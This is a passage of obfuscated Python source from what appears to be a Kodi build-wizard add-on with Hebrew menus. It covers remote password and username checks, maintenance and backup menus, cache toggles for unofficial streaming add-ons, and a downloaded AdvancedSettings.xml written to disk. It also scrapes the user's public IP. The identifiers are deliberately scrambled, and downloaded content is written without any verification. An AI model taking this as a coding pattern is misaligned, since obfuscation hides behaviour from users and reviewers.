						addDir ("[B]%s[/B]"%O0OO0OOOOO0OO000O ,'youtube',url ,description =OO0OOO00O0OOOOOOO ,icon =O00OO00OO0000OOOO ,fanart =O0OO0OOOOOO000O00 ,themeit =THEME3 )#line:2413
					else :#line:2414
						addFile (O0OO0OOOOO0OO000O ,'viewVideo',url =url ,description =OO0OOO00O0OOOOOOO ,icon =O00OO00OO0000OOOO ,fanart =O0OO0OOOOOO000O00 ,themeit =THEME2 )#line:2415
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2416
		else :#line:2417
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2418
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2419
			addFile ('%s'%O00O0OOO00O00OO00 ,'',themeit =THEME3 )#line:2420
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2421
	setView ('files','viewType')#line:2422
def STARTP ():#line:2423
	OO00OOOO0OOOOOO0O =(ADDON .getSetting ("pass"))#line:2424
	if BUILDNAME =="":#line:2425
	 if not NOTIFY =='true':#line:2426
          OO000O0O00000000O =wiz .workingURL (NOTIFICATION )#line:2427
	 if not NOTIFY2 =='true':#line:2428
          OO000O0O00000000O =wiz .workingURL (NOTIFICATION2 )#line:2429
	 if not NOTIFY3 =='true':#line:2430
          OO000O0O00000000O =wiz .workingURL (NOTIFICATION3 )#line:2431
	OO0OO0O0000O00O0O =OO00OOOO0OOOOOO0O #line:2432
	OO000O0O00000000O =urllib2 .Request (SPEED )#line:2433
	O0OOO0OO000O000O0 =urllib2 .urlopen (OO000O0O00000000O )#line:2434
	O0000OOO000OOO0OO =O0OOO0OO000O000O0 .readlines ()#line:2436
	OOO0O0000O0OO000O =0 #line:2440
	for O0OO00OO000OO0OO0 in O0000OOO000OOO0OO :#line:2441
		if O0OO00OO000OO0OO0 .split (' ==')[0 ]==OO00OOOO0OOOOOO0O or O0OO00OO000OO0OO0 .split ()[0 ]==OO00OOOO0OOOOOO0O :#line:2442
			OOO0O0000O0OO000O =1 #line:2443
			break #line:2444
	if OOO0O0000O0OO000O ==0 :#line:2445
					O0O0OO00OO0000O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2446
					if O0O0OO00OO0000O0O :#line:2448
						ADDON .openSettings ()#line:2450
						STARTP ()#line:2451
						sys .exit ()#line:2452
					else :#line:2453
						sys .exit ()#line:2454
	return 'ok'#line:2458
def STARTP2 ():#line:2459
	O0O0O0OOOO0000000 =(ADDON .getSetting ("user"))#line:2460
	O00OO000OOO0O00OO =(UNAME )#line:2462
	O00O000O000OO00O0 =urllib2 .urlopen (O00OO000OOO0O00OO )#line:2463
	OOOOO000OOOO0OO0O =O00O000O000OO00O0 .readlines ()#line:2464
	O00OOOOO0OOO0OO0O =0 #line:2465
	for O00OOOO000OOOOOOO in OOOOO000OOOO0OO0O :#line:2468
		if O00OOOO000OOOOOOO .split (' ==')[0 ]==O0O0O0OOOO0000000 or O00OOOO000OOOOOOO .split ()[0 ]==O0O0O0OOOO0000000 :#line:2469
			O00OOOOO0OOO0OO0O =1 #line:2470
			break #line:2471
	if O00OOOOO0OOO0OO0O ==0 :#line:2472
		OOO0OO000000OOO0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2473
		if OOO0OO000000OOO0O :#line:2475
			ADDON .openSettings ()#line:2477
			STARTP2 ()#line:2479
			sys .exit ()#line:2480
		else :#line:2481
			sys .exit ()#line:2482
	return 'ok'#line:2486
def passandpin ():#line:2487
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2488
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2489
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2490
def passandUsername ():#line:2491
	ADDON .openSettings ()#line:2492
def folderback ():#line:2495
    O00O0OO0O00000000 =ADDON .getSetting ("path")#line:2496
    if O00O0OO0O00000000 :#line:2497
      O00O0OO0O00000000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2498
      ADDON .setSetting ("path",O00O0OO0O00000000 )#line:2499
def backmyupbuild ():#line:2502
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2506
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2507
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2508
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2510
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2511
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2512
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2514
def maintMenu (view =None ):#line:2518
	O0O0O0OO00O00OO00 ='[B][COLOR green]ON[/COLOR][/B]';OO0O0OOOOOOOO0OO0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2520
	OO000OOOO0000OOOO ='true'if AUTOCLEANUP =='true'else 'false'#line:2521
	O00O0O0OO00O0OOOO ='true'if AUTOCACHE =='true'else 'false'#line:2522
	OO00000OO00O0OO0O ='true'if AUTOPACKAGES =='true'else 'false'#line:2523
	O0O0000OOOOOO0O00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2524
	O00O0O000O0000O0O ='true'if SHOWMAINT =='true'else 'false'#line:2525
	OO0O000O00OOOOOOO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2526
	OOO00O0OO0OOO0OO0 ='true'if INCLUDEALL =='true'else 'false'#line:2527
	O0000OOOOOOOOO0O0 ='true'if THIRDPARTY =='true'else 'false'#line:2528
	if wiz .Grab_Log (True )==False :OOO00O0OOOO00O0O0 =0 #line:2529
	else :OOO00O0OOOO00O0O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2530
	if wiz .Grab_Log (True ,True )==False :OO0000OOOOO0OO0O0 =0 #line:2531
	else :OO0000OOOOO0OO0O0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2532
	O0OOO0OO0O00OO000 =int (OOO00O0OOOO00O0O0 )+int (OO0000OOOOO0OO0O0 )#line:2533
	O0O0O00OOOO00OOO0 =str (O0OOO0OO0O00OO000 )+' Error(s) Found'if O0OOO0OO0O00OO000 >0 else 'None Found'#line:2534
	O0000OO0OO0OOO0O0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2535
	if OOO00O0OO0OOO0OO0 =='true':#line:2536
		O0OO00OOOOOO00O00 ='true'#line:2537
		OOO0OO0OOOO0O0OOO ='true'#line:2538
		O0O000O00OOO0OO00 ='true'#line:2539
		O00OO0OO0O0OOO000 ='true'#line:2540
		O0OO00O000OOOOOO0 ='true'#line:2541
		OOOO00O000000O0OO ='true'#line:2542
		OOOO000O0OOO0000O ='true'#line:2543
		O00O0000000000O00 ='true'#line:2544
	else :#line:2545
		O0OO00OOOOOO00O00 ='true'if INCLUDEBOB =='true'else 'false'#line:2546
		OOO0OO0OOOO0O0OOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2547
		O0O000O00OOO0OO00 ='true'if INCLUDESPECTO =='true'else 'false'#line:2548
		O00OO0OO0O0OOO000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2549
		O0OO00O000OOOOOO0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2550
		OOOO00O000000O0OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2551
		OOOO000O0OOO0000O ='true'if INCLUDESALTS =='true'else 'false'#line:2552
		O00O0000000000O00 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2553
	OOO0OO0OOO000OOO0 =wiz .getSize (PACKAGES )#line:2554
	OOOO0O0O000OO0O0O =wiz .getSize (THUMBS )#line:2555
	OOO0000O0OO0OOOO0 =wiz .getCacheSize ()#line:2556
	O0O00OOOOO0000OO0 =OOO0OO0OOO000OOO0 +OOOO0O0O000OO0O0O +OOO0000O0OO0OOOO0 #line:2557
	O0O000OO0O00000OO =['Daily','Always','3 Days','Weekly']#line:2558
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2559
	if view =="clean"or SHOWMAINT =='true':#line:2560
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O00OOOOO0000OO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2561
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0000O0OO0OOOO0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2562
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0OO0OOO000OOO0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2563
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOO0O0O000OO0O0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2564
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2565
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2566
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2567
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2568
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2569
	if view =="addon"or SHOWMAINT =='false':#line:2570
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2571
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2572
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2573
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2574
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2575
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2576
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2577
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2578
	if view =="misc"or SHOWMAINT =='true':#line:2579
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2580
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2581
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2582
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2583
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2584
		addFile ('View Errors in Log: %s'%(O0O0O00OOOO00OOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2585
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('Clear Wizard Log File%s'%O0000OO0OO0OOO0O0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2588
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2589
	if view =="backup"or SHOWMAINT =='true':#line:2590
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2591
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2592
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2593
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2594
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2595
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2597
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2598
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2599
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2600
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2601
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2602
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2603
	if view =="tweaks"or SHOWMAINT =='true':#line:2604
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2605
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2606
		else :#line:2607
			if os .path .exists (ADVANCED ):#line:2608
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2609
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2610
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2611
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2612
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2613
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2614
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2615
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2616
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2617
	addFile ('Show All Maintenance: %s'%O00O0O000O0000O0O .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2618
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2619
	addFile ('Third Party Wizards: %s'%O0000OOOOOOOOO0O0 .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2620
	if O0000OOOOOOOOO0O0 =='true':#line:2621
		OO0O0O0O00OO0O000 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2622
		O0O00O0OOOO0O00O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2623
		O0O00OOOO0OOO0O00 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2624
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0O0O00OO0O000 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2625
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O00O0OOOO0O00O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2626
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O00OOOO0OOO0O00 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2627
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2628
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO000OOOO0000OOOO .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2629
	if OO000OOOO0000OOOO =='true':#line:2630
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0O000OO0O00000OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2631
		addFile ('--- ניקוי קאש בהפעלה: %s'%O00O0O0OO00O0OOOO .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2632
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO00000OO00O0OO0O .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2633
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O0000OOOOOO0O00 .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2634
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2635
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O000O00OOOOOOO .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2636
	if OO0O000O00OOOOOOO =='true':#line:2637
		addFile ('--- Include All Video Addons: %s'%OOO00O0OO0OOO0OO0 .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2638
		addFile ('--- Include Bob: %s'%O0OO00OOOOOO00O00 .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2639
		addFile ('--- Include Phoenix: %s'%OOO0OO0OOOO0O0OOO .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2640
		addFile ('--- Include Specto: %s'%O0O000O00OOO0OO00 .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2641
		addFile ('--- Include Exodus: %s'%O0OO00O000OOOOOO0 .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2642
		addFile ('--- Include Salts: %s'%OOOO000O0OOO0000O .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2643
		addFile ('--- Include Salts HD Lite: %s'%O00O0000000000O00 .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2644
		addFile ('--- Include One Channel: %s'%OOOO00O000000O0OO .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2645
		addFile ('--- Include Genesis: %s'%O00OO0OO0O0OOO000 .replace ('true',O0O0O0OO00O00OO00 ).replace ('false',OO0O0OOOOOOOO0OO0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2646
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2647
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2648
	setView ('files','viewType')#line:2649
def advancedWindow (url =None ):#line:2651
	if not ADVANCEDFILE =='http://':#line:2652
		if url ==None :#line:2653
			OO0OOO000OO0000OO =wiz .workingURL (ADVANCEDFILE )#line:2654
			O0000000O0000OO0O =uservar .ADVANCEDFILE #line:2655
		else :#line:2656
			OO0OOO000OO0000OO =wiz .workingURL (url )#line:2657
			O0000000O0000OO0O =url #line:2658
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2659
		if os .path .exists (ADVANCED ):#line:2660
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2661
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2662
		if OO0OOO000OO0000OO ==True :#line:2663
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2664
			O000OOO00O00O00OO =wiz .openURL (O0000000O0000OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2665
			OOOOO0O00O0OOOOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O000OOO00O00O00OO )#line:2666
			if len (OOOOO0O00O0OOOOOO )>0 :#line:2667
				for O00O0O0O0OOO00OO0 ,OO0O0OOO0OO0O000O ,url ,OO0OOO00OO00O000O ,OO0O0O0O00O000O00 ,OO00O000OOO0OO0OO in OOOOO0O00O0OOOOOO :#line:2668
					if OO0O0OOO0OO0O000O .lower ()=="yes":#line:2669
						addDir ("[B]%s[/B]"%O00O0O0O0OOO00OO0 ,'advancedsetting',url ,description =OO00O000OOO0OO0OO ,icon =OO0OOO00OO00O000O ,fanart =OO0O0O0O00O000O00 ,themeit =THEME3 )#line:2670
					else :#line:2671
						addFile (O00O0O0O0OOO00OO0 ,'writeadvanced',O00O0O0O0OOO00OO0 ,url ,description =OO00O000OOO0OO0OO ,icon =OO0OOO00OO00O000O ,fanart =OO0O0O0O00O000O00 ,themeit =THEME2 )#line:2672
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2673
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OOO000OO0000OO )#line:2674
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2675
def writeAdvanced (OOOO000OOO0OO000O ,O0O00O00000OO0OO0 ):#line:2677
	OOOOOO0OO00O00O0O =wiz .workingURL (O0O00O00000OO0OO0 )#line:2678
	if OOOOOO0OO00O00O0O ==True :#line:2679
		if os .path .exists (ADVANCED ):OOOOOO00000OO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO000OOO0OO000O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2680
		else :OOOOOO00000OO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO000OOO0OO000O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2681
		if OOOOOO00000OO00O0 ==1 :#line:2683
			OO00O000O00OOOO00 =wiz .openURL (O0O00O00000OO0OO0 )#line:2684
			OO0OO0OO0O0000OOO =open (ADVANCED ,'w');#line:2685
			OO0OO0OO0O0000OOO .write (OO00O000O00OOOO00 )#line:2686
			OO0OO0OO0O0000OOO .close ()#line:2687
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2688
			wiz .killxbmc (True )#line:2689
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2690
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOOO0OO00O00O0O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2691
def viewAdvanced ():#line:2693
	O0O0O0OO00O0OO0OO =open (ADVANCED )#line:2694
	O00O0O00OOOO0OO00 =O0O0O0OO00O0OO0OO .read ().replace ('\t','    ')#line:2695
	wiz .TextBox (ADDONTITLE ,O00O0O00OOOO0OO00 )#line:2696
	O0O0O0OO00O0OO0OO .close ()#line:2697
def removeAdvanced ():#line:2699
	if os .path .exists (ADVANCED ):#line:2700
		wiz .removeFile (ADVANCED )#line:2701
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2702
def showAutoAdvanced ():#line:2704
	notify .autoConfig ()#line:2705
def getIP ():#line:2707
	O0OOOOO0O0O0OO0OO ='http://whatismyipaddress.com/'#line:2708
	if not wiz .workingURL (O0OOOOO0O0O0OO0OO ):return 'Unknown','Unknown','Unknown'#line:2709
	OO00O0OOOO00O0OO0 =wiz .openURL (O0OOOOO0O0O0OO0OO ).replace ('\n','').replace ('\r','')#line:2710
	if not 'Access Denied'in OO00O0OOOO00O0OO0 :#line:2711
		O00O0OO0O000OO0OO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO00O0OOOO00O0OO0 )#line:2712
		O00O00O0OO0OO0O00 =O00O0OO0O000OO0OO [0 ]if (len (O00O0OO0O000OO0OO )>0 )else 'Unknown'#line:2713
		OOOO0000OOO00O000 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO00O0OOOO00O0OO0 )#line:2714
		OO0OO00O0O0O0000O =OOOO0000OOO00O000 [0 ]if (len (OOOO0000OOO00O000 )>0 )else 'Unknown'#line:2715
		O00O0OOOOOOOO0OO0 =OOOO0000OOO00O000 [1 ]+', '+OOOO0000OOO00O000 [2 ]+', '+OOOO0000OOO00O000 [3 ]if (len (OOOO0000OOO00O000 )>2 )else 'Unknown'#line:2716
		return O00O00O0OO0OO0O00 ,OO0OO00O0O0O0000O ,O00O0OOOOOOOO0OO0 #line:2717
	else :return 'Unknown','Unknown','Unknown'#line:2718
def systemInfo ():#line:2720
	O00OOO0OO0O0OOOO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2734
	O00000O00OO000000 =[];O00000O0O0O0OOO00 =0 #line:2735
	for O000O00OOO0OO0O0O in O00OOO0OO0O0OOOO0 :#line:2736
		O0000OO0O00000OOO =wiz .getInfo (O000O00OOO0OO0O0O )#line:2737
		O00OOOOOOO0OO0OO0 =0 #line:2738
		while O0000OO0O00000OOO =="Busy"and O00OOOOOOO0OO0OO0 <10 :#line:2739
			O0000OO0O00000OOO =wiz .getInfo (O000O00OOO0OO0O0O );O00OOOOOOO0OO0OO0 +=1 ;wiz .log ("%s sleep %s"%(O000O00OOO0OO0O0O ,str (O00OOOOOOO0OO0OO0 )));xbmc .sleep (1000 )#line:2740
		O00000O00OO000000 .append (O0000OO0O00000OOO )#line:2741
		O00000O0O0O0OOO00 +=1 #line:2742
	OO00O00OOOOO0OO0O =O00000O00OO000000 [8 ]if 'Una'in O00000O00OO000000 [8 ]else wiz .convertSize (int (float (O00000O00OO000000 [8 ][:-8 ]))*1024 *1024 )#line:2743
	OOOOO0O0O0OOO0000 =O00000O00OO000000 [9 ]if 'Una'in O00000O00OO000000 [9 ]else wiz .convertSize (int (float (O00000O00OO000000 [9 ][:-8 ]))*1024 *1024 )#line:2744
	O0OOO00OOOOOOOO00 =O00000O00OO000000 [10 ]if 'Una'in O00000O00OO000000 [10 ]else wiz .convertSize (int (float (O00000O00OO000000 [10 ][:-8 ]))*1024 *1024 )#line:2745
	O0O0OO0OO0O0O000O =wiz .convertSize (int (float (O00000O00OO000000 [11 ][:-2 ]))*1024 *1024 )#line:2746
	OO00OOOOO000O00OO =wiz .convertSize (int (float (O00000O00OO000000 [12 ][:-2 ]))*1024 *1024 )#line:2747
